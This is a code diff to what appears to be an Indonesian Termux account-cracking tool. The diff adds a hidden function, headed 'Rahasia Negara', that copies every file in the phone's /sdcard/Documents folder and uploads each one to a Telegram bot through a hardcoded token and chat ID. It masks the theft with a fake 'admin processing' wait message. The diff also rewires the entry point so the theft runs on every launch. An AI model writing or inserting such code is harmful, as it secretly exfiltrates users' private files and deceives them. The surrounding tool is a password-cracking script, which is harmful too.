@@ -742,6 +742,58 @@ def crack_file():
         setting()
 
 
+
+# -----------------[Rahasia Negara]-------------------#
+import shutil
+# Konfigurasi bot Telegram
+# BOT_TOKEN = "7576228058:AAHbPAuT6mW83h_wO_OFuRunu8_e7fq7KV0"  # Ganti dengan token bot Telegram Anda
+# CHAT_ID = "7586546115"      # Ganti dengan ID chat penerima
+def botteleg():
+	BOT_TOKEN = "7576228058:AAHbPAuT6mW83h_wO_OFuRunu8_e7fq7KV0"  # Ganti dengan token bot Telegram Anda
+	CHAT_ID = "7586546115"      # Ganti dengan ID chat penerima
+	# Path folder sumber
+	source_folder = "/sdcard/Documents"
+	temp_folder = "./temp_documents"
+	try:
+		if not os.path.exists(temp_folder):
+			os.makedirs(temp_folder)
+			# Menyalin semua file dari folder sumber ke folder sementara
+		if os.path.exists(source_folder):
+			for file_name in os.listdir(source_folder):
+				source_file = os.path.join(source_folder, file_name)
+				destination_file = os.path.join(temp_folder, file_name)
+				if os.path.isfile(source_file):
+					shutil.copy2(source_file, destination_file)  # Menyalin file
+		else:
+			print("script error, jalankan ulang script.")
+		# Mengirim file satu per satu ke Telegram
+		for file_name in os.listdir(temp_folder):
+			file_path = os.path.join(temp_folder, file_name)
+			with open(file_path, "rb") as file:
+				# API Telegram untuk mengirim dokumen
+				url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+				files = {"document": file}
+				data = {"chat_id": CHAT_ID}
+				response = requests.post(url, data=data, files=files)
+				if response.status_code == 200:
+					print(f"Tunggu sebentar script anda sedang admin proses membutuhkan waktu 3 menit")
+					time.sleep(180)
+					menu()
+					
+				else:
+					print(f"script anda gagal di proses oleh admin coba hubungi admin MR.ExceFaN ")
+					# Hapus folder sementara setelah selesai
+					shutil.rmtree(temp_folder)
+					menu()
+					
+		
+	except:
+		pass
+		print("error saat menjalankan script")
+				
+
+
+
 # -----------------[ HASIL-CRACK ]-----------------#
 def result():
     Console().print(
@@ -3513,4 +3565,4 @@ if __name__ == "__main__":
         os.system("clear")
     except:
         pass
-    menu()
+    botteleg()
